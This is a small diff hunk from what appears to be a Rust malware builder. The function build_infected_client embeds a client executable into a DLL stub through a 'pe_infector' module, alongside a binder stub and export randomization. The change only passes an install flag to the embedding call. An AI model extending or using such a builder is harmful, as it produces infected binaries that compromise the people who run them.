@@ -154,7 +154,7 @@ pub async fn build_infected_client(
     let binder_stub_path = exe_dir.join("res/binder_stub.exe");
 
     // 1. Embed client in DLL
-    crate::utils::pe_infector::embed_client_in_dll(&dll_stub_path, &client_exe_path)?;
+    crate::utils::pe_infector::embed_client_in_dll(&dll_stub_path, &client_exe_path, !enable_install)?;
 
     // 2. Randomize exports if needed
     let final_dll_name = if dll_name.is_empty() {
